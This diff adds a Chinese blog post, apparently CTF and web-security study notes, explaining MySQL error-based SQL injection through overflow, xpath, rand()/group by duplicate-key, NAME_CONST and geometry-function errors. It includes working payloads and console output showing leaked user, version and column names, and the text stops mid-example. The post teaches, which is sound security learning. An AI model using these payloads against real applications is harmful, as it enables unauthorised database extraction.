@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cs-cshi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="报错注入">
+<meta property="og:url" content="https://cs-cshi.github.io/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Chang">
+<meta property="og:description" content="SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-05-14T07:30:00.000Z">
+<meta property="article:modified_time" content="2021-05-14T11:36:40.149Z">
+<meta property="article:author" content="Charles">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="Web 安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://cs-cshi.github.io/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>报错注入 | Chang</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chang</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页 | home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于 | about</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签 | tags<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类 | categories<span class="badge">22</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档 | archives<span class="badge">31</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索 | search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cs-cshi.github.io/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Charles">
+      <meta itemprop="description" content="慢下来，记录生活点滴，畅游人类知识和艺术的海洋。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          报错注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-14 15:30:00 / 修改时间：19:36:40" itemprop="dateCreated datePublished" datetime="2021-05-14T15:30:00+08:00">2021-05-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web-%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web 安全</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<span id="more"></span>
+
+<p>这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
+<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
+<ol>
+<li>BIGINT等数据类型溢出</li>
+<li>xpath语法错误</li>
+<li>concat+rand()+group_by()导致主键重复</li>
+<li>一些特性</li>
+</ol>
+<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
+<h2 id="1-数据溢出"><a href="#1-数据溢出" class="headerlink" title="1. 数据溢出"></a>1. 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/integer-types.html">Integer Types (Exact Value)</a>，如下表：</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Storage (Bytes)</th>
+<th>Minimum Value Signed</th>
+<th>Minimum Value Unsigned</th>
+<th>Maximum Value Signed</th>
+<th>Maximum Value Unsigned</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TINYINT</td>
+<td>1</td>
+<td>-128</td>
+<td>0</td>
+<td>127</td>
+<td>255</td>
+</tr>
+<tr>
+<td>SMALLINT</td>
+<td>2</td>
+<td>-32768</td>
+<td>0</td>
+<td>32767</td>
+<td>65535</td>
+</tr>
+<tr>
+<td>MEDIUMINT</td>
+<td>3</td>
+<td>-8388608</td>
+<td>0</td>
+<td>8388607</td>
+<td>16777215</td>
+</tr>
+<tr>
+<td>INT</td>
+<td>4</td>
+<td>-2147483648</td>
+<td>0</td>
+<td>2147483647</td>
+<td>4294967295</td>
+</tr>
+<tr>
+<td>BIGINT</td>
+<td>8</td>
+<td>-9223372036854775808</td>
+<td>0</td>
+<td>9223372036854775807</td>
+<td>18446744073709551615</td>
+</tr>
+</tbody></table>
+<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/out-of-range-and-overflow.html">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select 18446744073709551615+1;</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(18446744073709551615 + 1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ~0;</span></span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ~0+1;</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(~(0) + 1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select * from (select user())x);</span></span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select !(select * from (select user())x);</span></span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select !(select * from (select user())x)+1;</span></span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>同理，利用exp函数也会产生类似的溢出错误：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(709);</span></span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(710);</span></span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注入姿势：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(~(select*from(select user())x));</span></span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select(!x-~0)from(select(select user())x)a);</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(&#x27;root@localhost&#x27;)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select(!x-~0)from(select(select user())x)a);</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(`a`.`x`)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">define ERRMSGSIZE (512)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-xpath语法错误"><a href="#2-xpath语法错误" class="headerlink" title="2. xpath语法错误"></a>2. xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select extractvalue(1,<span class="string">&#x27;/a/b&#x27;</span>);</span></span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&#x27;/a/b&#x27;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-主键重复"><a href="#3-主键重复" class="headerlink" title="3. 主键重复"></a>3. 主键重复</h2><blockquote>
+<p>相关函数</p>
+<ul>
+<li>rand()：产生一个 0~1 的随机数</li>
+<li>floor()：向下取整</li>
+<li>floor(rand(0)*2))：原本 floor(rand(0)) 得到固定的0，但乘以2 后得到的就是不固定的 0 或者 1</li>
+</ul>
+</blockquote>
+<p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*) from <span class="built_in">test</span> group by concat(version(),floor(rand(0)*2));</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from <span class="built_in">test</span>;</span></span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
+<ul>
+<li><p>先是建立虚拟表，其中key为主键，不可重复：</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+</table>
+</li>
+<li><p>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1:</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+<tr>
+<td>candy</td>
+<td>1</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p>当这个操作遇到 rand(0)*2 时，就会发生错误，其原因在于rand()函数使用了随机种子 0，得到的是一个稳定的序列，也就是说每次以0作为随机种子得到的序列是一样的。</p>
+<p>同理，floor(rand(0)*2)则会固定得到序列(这个很重要)，假设我们得到的序列是 011011..</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select floor(rand(0)*2) from <span class="built_in">test</span>;</span></span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>回到之前的group by语句上，我们将其改为<code>select count(*) from test group by floor(rand(0)*2)</code>，看看每一步是什么情况：</p>
+<ul>
+<li>语句执行的时候建立一个虚拟表，整个工作流程大致如下：开始查询数据时，读取数据库数据，查看虚拟表中是否存在，不存在则插入新纪录，存在则 count(*) 直接加 1。 假设 floor(rand(0)*2) 得到的固定序列是 011011…</li>
+<li>先创建一个虚拟表<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+</table>
+</li>
+<li>取第一条记录，执行 floor(rand(0)*2)，发现结果为0（第一次计算），查询虚拟表，发现 0 的键值不存在，则 floor(rand(0)*2) 会被再会计算一次，结果为1（第二次计算），插入虚表<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>1</td>
+</tr>
+</tbody></table>
+</li>
+<li>查第二条记录，再次计算 floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现键值 1 存在，所以此时不在计算第二次，直接count(</em>)值加1，如下：<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>2(1+1)</td>
+</tr>
+</tbody></table>
+</li>
+<li>查第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第四次计算)，发现键值没有0，则尝试插入记录，此时会又一次计算floor(rand(0)*2)，结果1(第5次计算)当作虚表的主键，而此时1这个主键已经存在于虚表中了，所以在插入的时候就会报主键重复的错误了。</li>
+<li>最终报错的结果，即主键’1’重复：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*) from <span class="built_in">test</span> group by floor(rand(0)*2);</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>整个查询过程中，floor(rand(0)*2)被计算了5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。关于这个rand()的问题，官方文档在这里有个说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations.</span><br></pre></td></tr></table></figure>
+
+<p>如果有一个序列开头时 0,1,0,0 或者 1,0,1,1 则无论如何都不会报错了，因为虚表开头两个主键会分别是 0 和 1，后面的就直接count(*)加1了</p>
+<h2 id="4-一些特性"><a href="#4-一些特性" class="headerlink" title="4. 一些特性"></a>4. 一些特性</h2><h3 id="4-1-列名重复"><a href="#4-1-列名重复" class="headerlink" title="4.1 列名重复"></a>4.1 列名重复</h3><p>mysql列名重复会报错，我们利用name_const来制造一个列：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.7.17&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>根据<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const">官方文档</a>，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p>
+<p>利用这个特性加上join函数可以爆列名：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select *  from(select * from <span class="built_in">test</span> a join <span class="built_in">test</span> b)c;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select *  from(select * from <span class="built_in">test</span> a join <span class="built_in">test</span> b using(id))c;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;name&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-几何函数"><a href="#4-2-几何函数" class="headerlink" title="4.2 几何函数"></a>4.2 几何函数</h3><p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5.5.47</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select multipoint((select * from (select * from (select version())a)b));</span></span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;(select `b`.`version()` from ((select &#x27;5.5.47&#x27; AS `version()` from dual) `b`))&#x27; value found during parsing</span><br><span class="line">5.7.17</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select multipoint((select * from (select * from (select version())a)b));</span></span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;(select `a`.`version()` from ((select version() AS `version()`) 